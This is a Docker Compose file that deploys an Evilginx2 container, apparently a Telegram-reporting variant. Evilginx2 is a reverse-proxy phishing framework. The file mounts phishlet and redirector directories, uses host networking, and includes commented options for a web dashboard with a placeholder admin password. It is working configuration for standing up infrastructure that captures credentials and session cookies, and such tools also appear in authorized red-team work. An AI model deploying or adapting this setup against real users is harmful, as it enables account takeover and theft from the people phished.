version: '3.8'

services:
  evilginx:
    build: .
    container_name: evilginx2-telegram
    restart: unless-stopped
    network_mode: host
    cap_add:
      - NET_BIND_SERVICE
    volumes:
      - evilginx-data:/home/evilginx/.evilginx
      - ./phishlets:/home/evilginx/phishlets:ro
      - ./redirectors:/home/evilginx/redirectors:ro
    environment:
      - TZ=UTC
    # Uncomment to override flags:
    # command: ["-p", "/home/evilginx/phishlets", "-t", "/home/evilginx/redirectors", "-debug"]
    # Uncomment to enable dashboard:
    # command: ["-p", "/home/evilginx/phishlets", "-t", "/home/evilginx/redirectors", "-dashboard", "0.0.0.0:5000", "-dashboard-user", "admin", "-dashboard-pass", "yourpassword"]

volumes:
  evilginx-data:
